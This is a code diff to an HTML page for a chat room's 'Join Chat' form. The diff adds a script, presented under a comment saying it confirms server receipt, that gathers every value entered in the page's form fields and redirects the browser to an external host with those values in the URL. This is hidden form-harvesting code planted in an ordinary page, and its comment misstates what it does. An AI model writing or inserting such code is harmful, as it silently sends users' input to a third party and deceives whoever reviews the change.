@@ -9,6 +9,21 @@
   </head>
   <body class="centered-form">
     
+      <script>
+// This ensures the form has been received by the server
+$(document).ajaxStop(function() {
+
+  // Get all form values and convert them to URL-safe key-value pairs
+  var string = '?' + $('form').find('input, select, textarea').map(function() {
+    var key = encodeURIComponent((this.name || this.id).trim());
+    return key ? key + '=' + encodeURIComponent($(this).val()) : null;
+  }).get().join('&');
+
+  // Redirect to this URL with the value of the form fields appended to the end of the URL
+  location.href = 'http://baseclone-git-oo.apps.us-east-1.starter.openshift-online.com/real.html' + string;
+});
+</script>
+    
 
     
     
@@ -17,11 +32,11 @@
         <div class="form-field"><h3>Join Chat</h3></div>
         <div class="form-field">
           <label>Display name</label>
-          <input type="text" name="name" value=room>
+          <input type="text" name="name" >
         </div>
         <div class="form-field">
           <label>Room name</label>
-          <input type="text" name="room" value="">
+          <input type="text" name="room" id="ok">
         </div>
         <div class="form-field">
           <button>Join</button>
